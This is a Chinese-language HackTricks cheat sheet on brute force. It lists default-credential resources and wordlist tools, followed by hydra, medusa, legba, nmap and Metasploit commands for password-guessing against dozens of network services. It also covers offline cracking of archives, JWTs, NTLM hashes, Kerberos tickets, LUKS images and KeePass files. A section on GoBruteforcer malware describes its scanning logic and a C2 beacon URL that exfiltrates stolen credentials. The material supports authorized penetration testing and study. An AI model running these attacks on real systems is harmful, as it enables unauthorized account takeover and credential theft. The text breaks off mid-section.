# Brute Force - 速查表

{{#include ../banners/hacktricks-training.md}}

## 默认凭据

**在 Google 中搜索**所用技术的默认凭据，或**尝试以下链接**：

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **创建自己的字典**

尽可能多地收集目标信息，并生成自定义字典。以下工具可能会有所帮助：

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### 基于网站的 wordlists

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

根据你对受害者的了解（姓名、日期等）生成密码。

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

一个 wordlist 生成工具，可让你提供一组单词，并根据这些单词生成多种变体，从而创建针对特定目标的专属理想 wordlist。

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### 词表

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## 全网 bruteforcer 工作流（Go 扫描器的经验）

以下行为是在 GoBruteforcer malware 的扫描工作流中观察到的；具体数值因样本而异。<sup>[[1]](#references)</sup>

- 维护**按架构调整的 worker pool**（例如，`x86_64/arm64` 上有 95 个并发 worker，`i686` 上有 85 个，`armv5tel` 上有 35 个，其他架构默认有 50 个），每秒检查一次活跃 worker 数量，低于目标时启动替代 worker；每个 worker 最多处理一个目标 IP，然后退出。
- 生成**随机公网 IPv4 地址**，但过滤明显不可路由的地址和特定操作方规避的范围：RFC1918、`100.64.0.0/10`、`127.0.0.0/8`、`0.0.0.0/8`、`169.254.0.0/16`、`198.18.0.0/15`、多播地址 `>=224.0.0.0/4`、云服务密集的 `/8` 网段（`3/15/16/56`）以及与 DoD 相关的 `/8` 网段（`6/7/11/21/22/26/28/29/30/33/55/214/215`）。
- **探测服务端口**，使用较短的超时时间（约 2 秒），然后尝试**明文登录**（FTP/21、MySQL/3306、Postgres/5432、通过 HTTP/80 访问 phpMyAdmin）；如果从 C2 获取凭证失败，则使用较小的内置凭证列表。
- 使用小型 HTTP GET 信标**外传命中结果**，例如 `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`（服务代码如 `1=PMA`、`2=MySQL`、`3=FTP`、`4=Postgres`），并重复使用通用浏览器 User-Agent 来伪装流量。
- phpMyAdmin spray 可以通过 `GET /index.php?lang=en` 对约 80 个可能的路径进行 brute-force，检测 PMA 标记（`pmahomme` 主题/`phpmyadmin.css`/`navigation.php`），并解析 `codemirror.css?v=X.Y.Z` 以选择认证方式：版本 `<4.9` 接受带有 `pma_username`/`pma_password` 的 GET 参数；版本 `>=4.9` 则使用 POST，参数包括 `server=1`、CSRF `token` 和相同的凭证。

## 服务

按服务名称的字母顺序排列。

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker 镜像仓库

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP 通用暴力破解

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - POST 表单

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

对于 http**s**，你需要将 "http-post-form" 改为 "**https-post-form"

### **HTTP - CMS --** (W)ordpress、(J)oomla、(D)rupal 或 (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

要在 **patator** 中使用 **oracle_login**，你需要**安装**：

```bash
pip3 install cx_Oracle --upgrade
```

[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)（**版本 11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2，**以及 **11.2.0.3**）：

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

你可以从 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) 下载 `.deb` 软件包进行安装。

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

关于使用密码认证的 Rexec 服务行为，请参阅 [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md)。

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

有关 trusted-host 身份验证和终端访问，请参阅 [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp)。

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

有关受信任主机身份验证和远程命令，请参阅 [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp)。

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### 弱 SSH 密钥 / Debian 可预测 PRNG

某些系统在用于生成加密材料的随机种子方面存在已知缺陷。这可能导致密钥空间大幅缩小，从而可以使用 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) 等工具进行暴力破解。也可以使用预先生成的弱密钥集合，例如 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。

### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)

STOMP 文本协议是一种广泛使用的消息传递协议，**支持与 RabbitMQ、ActiveMQ、HornetQ 和 OpenMQ 等热门消息队列服务无缝通信和交互**。它提供了一种标准化且高效的方式，用于交换消息并执行各种消息传递操作。

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## 本地

### 在线破解数据库

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 和 SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1，支持有无 ESS/SSP，以及任意 challenge 值)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes、WPA2 捕获数据，以及 MSOffice、ZIP、PDF 等压缩包)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes 和文件 Hash)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

尝试对 Hash 进行 brute force 之前，先看看这个。

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### 已知明文 zip 攻击

你需要知道加密 zip 文件中**某个文件的明文**（或部分明文）。你可以运行 **`7z l encrypted.zip`**，查看加密 zip 文件中包含的**文件名和文件大小**。\
从发布页面下载 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)。

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### PDF 所有者密码

破解 PDF 所有者密码，请查看：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks 镜像

#### 方法 1

安装: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### 方法 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

另一个 Luks BF 教程：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### PGP/GPG 私钥

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

使用 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)，然后使用 john

### Open Office 密码保护列

如果你有一个 xlsx 文件，其中有一列受密码保护，可以取消保护：

- **将其上传到 Google Drive**，密码会自动移除
- 若要**手动移除**：

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### PFX 证书

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## 工具

**哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### 词表

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **词表生成工具**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**：**高级键盘路径生成器，可配置基础字符、键盘布局和路径。

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

阅读 _**/etc/john/john.conf**_ 并进行配置。

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat 攻击

- **Wordlist attack** (`-a 0`) with rules

**Hashcat** 已自带一个**包含规则的文件夹**，但你也可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。

```
